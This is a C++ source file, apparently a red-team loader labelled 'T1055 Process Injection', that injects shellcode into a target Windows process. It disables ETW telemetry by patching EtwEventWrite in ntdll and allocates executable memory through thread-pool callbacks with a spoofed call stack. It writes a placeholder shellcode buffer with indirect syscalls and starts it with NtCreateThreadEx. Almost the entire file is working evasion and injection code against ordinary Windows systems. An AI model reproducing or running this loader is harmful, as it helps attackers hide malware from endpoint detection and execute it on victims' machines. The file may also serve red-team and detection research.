/**
Editor: Thomas X Meng
T1055 Process Injection
Indirect Syscall + Halo gate + Custom Call Stack
reference: 
https://github.com/Dec0ne/HWSyscalls
**/
/***

*/
#include <iostream>
#include "syscall.h"
#include <cstdio>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
VirtualProtect_t VirtualProtect_p = NULL;

int DisableETW(void) {
	DWORD oldprotect = 0;
	unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

	unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

	VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);

	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	
	void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
	
	VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

	VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
	FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
	return 0;
}


typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(WINAPI* NtOpenProcess_t)(
	OUT          PHANDLE            ProcessHandle,
	IN           ACCESS_MASK        DesiredAccess,
	IN           POBJECT_ATTRIBUTES ObjectAttributes,
	IN OPTIONAL  PCLIENT_ID         ClientId
	);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT SIZE_T* RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect
	);


typedef NTSTATUS(NTAPI* NtWaitForSingleObject_t)(
	IN HANDLE ObjectHandle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER TimeOut OPTIONAL
	);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID StartAddress,
	IN PVOID Parameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT LPVOID BytesBuffer
	);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten
	);
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
	);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

// extern VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

extern "C" {
    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}


unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char* argv[]) {


    // If we place thge magic code outside of main (in .data), the writeprocessmemeory sometimes 
    // return -2147483635 status code, which is STATUS_INVALID_PARAMETER


	// HANDLE targetHandle;
	// OBJECT_ATTRIBUTES object;
	NTSTATUS status = 0;

    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = sizeof(magiccode);  

	HANDLE hProcess = NULL;
    if (argc < 2) {
        printf("Usage: %s <ProcessID>\n", argv[0]);
		printf("[-] No process ID provided. use current ID\n");
		DWORD dwCurrentProcessId = GetCurrentProcessId(); // Get the current process ID
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwCurrentProcessId); // Open the current process with full access

    } else {
		printf("[+] Process ID provided: %s\n", argv[1]);
	    DWORD pid = (DWORD)atoi(argv[1]); // Convert argument to DWORD
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); // Open the process with all access rights
		if (hProcess == NULL) {
			printf("Failed to open process with ID %lu. Error Code: %lu\n", pid, GetLastError());
			return 1;
		}
	}

    
	DisableETW();

	// initialise the call: 
	if (!OpnRICls())
		return -1;

	// object.Length = sizeof(OBJECT_ATTRIBUTES);
	// object.ObjectName = NULL;
	// object.Attributes = 0;
	// object.RootDirectory = NULL;
	// object.SecurityDescriptor = NULL;
	// int pid = atoi(argv[1]);
	
	// CLIENT_ID clientID = { (HANDLE)pid, NULL };

	// NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)PrepareSyscall((char*)"NtOpenProcess");
	// if (!pNtOpenProcess) {
	// 	std::cerr << "[-] Failed to prepare syscall for NtOpenProcess." << std::endl;
	// 	return -2;
	// }
	// status = pNtOpenProcess(&targetHandle, PROCESS_ALL_ACCESS, &object, &clientID);
	// std::cout << "[+] NtOpenProcess result: " << status << std::endl;


	// NtAllocateVirtualMemory_t pNtVirtualAlloc = (NtAllocateVirtualMemory_t)PrprSyscl((char*)"NtAllocateVirtualMemory");
	// if (!pNtVirtualAlloc) {
	// 	std::cerr << "[-] Failed to prepare syscall for NtVirtualAlloc." << std::endl;
	// 	return -2;
	// }
	// status = pNtVirtualAlloc(hProcess, &allocBuffer, 0, &buffSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// std::cout << "[+] NtVirtualAlloc result: " << status << std::endl;

    // LPVOID allocatedAddress = NULL;
    // SIZE_T allocatedsize = sizeof(magiccode);
	///////////////////////
    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory");
    ntAllocateVirtualMemoryArgs.hProcess = hProcess;
    ntAllocateVirtualMemoryArgs.address = &allocBuffer;
    ntAllocateVirtualMemoryArgs.size = &buffSize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;

    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpAllocWork");
    FARPROC pTpPostWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpPostWork");
    FARPROC pTpReleaseWork = GetProcAddress(GetModuleHandleA("ntdll"), "TpReleaseWork");

    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)IWillBeBack, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);

    if(allocBuffer == NULL) {
        printf("allocBuffer: %p\n", allocBuffer);
    }
    if(buffSize != sizeof(magiccode)) {
        printf("[-] buffSize size is not the same as magiccode size due to page size\n");
        printf("[-] buffSize size: %lu\n", buffSize);
        printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
    }


	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)PrprSyscl((char*)"NtWriteVirtualMemory");
	if (!pNtWriteVirtualMemory) {
		std::cerr << "[-] Failed to prepare syscall for NtWriteVirtualMemory." << std::endl;
		return -2;
	}
	status = pNtWriteVirtualMemory(hProcess, allocBuffer, magiccode, buffSize, NULL);
	std::cout << "[+] NtWriteVirtualMemory result: " << status << std::endl;


    // EnumThreadWindows(0, (WNDENUMPROC)allocBuffer, NULL);
    // EnumChildWindows(NULL, (WNDENUMPROC)allocBuffer, NULL);

    // ULONG oldProtect = 0;
    // SIZE_T size = sizeof(magiccode); // Ensure buffSize is correctly set to the allocated size
    // PVOID baseAddress = allocBuffer; // The base address should be the start of the allocated memory
	// NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrprSyscl((char*)"NtProtectVirtualMemory");
	// if (!pNtProtectVirtualMemory) {
	// 	std::cerr << "[-] Failed to prepare syscall for NtProtectVirtualMemory." << std::endl;
	// 	return -2;
	// }
	// status = pNtProtectVirtualMemory(hProcess, &baseAddress, &size, PAGE_EXECUTE_READ, &oldProtect);
	// std::cout << "[+] NtProtectVirtualMemory result: " << status << std::endl;


	getchar();
    HANDLE hThread;
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrprSyscl((char*)"NtCreateThreadEx");
	if (!pNtCreateThreadEx) {
		std::cerr << "[-] Failed to prepare syscall for NtCreateThreadEx." << std::endl;
		return -2;
	}
	status = pNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
	std::cout << "[+] NtCreateThreadEx result: " << status << std::endl;

	//call create remote thread
    // HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocBuffer, NULL, 0, NULL);
    // if (!hThread) {
    //     printf("Failed to create remote thread. Error Code: %lu\n", GetLastError());
    //     return FALSE;
    // }
	getchar();

    DWORD waitResult = WaitForSingleObject(hThread, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }
	getchar();
	// NtWaitForSingleObject_t pNtWaitForSingleObject = (NtWaitForSingleObject_t)PrprSyscl((char*)"NtWaitForSingleObject");
	// if (!pNtWaitForSingleObject) {
	// 	std::cerr << "[-] Failed to prepare syscall for NtWaitForSingleObject." << std::endl;
	// 	return -2;
	// }
	// status = pNtWaitForSingleObject(hThread, FALSE, NULL);
	// std::cout << "[+] NtWaitForSingleObject result: " << status << std::endl;
	// getchar();

	if (ClsRICls())
		std::cout << "[+] Cleaned up the exception handler." << std::endl;
	else
		std::cerr << "[-] Failed to clean up the exception handler." << std::endl;
	

	return 0;
}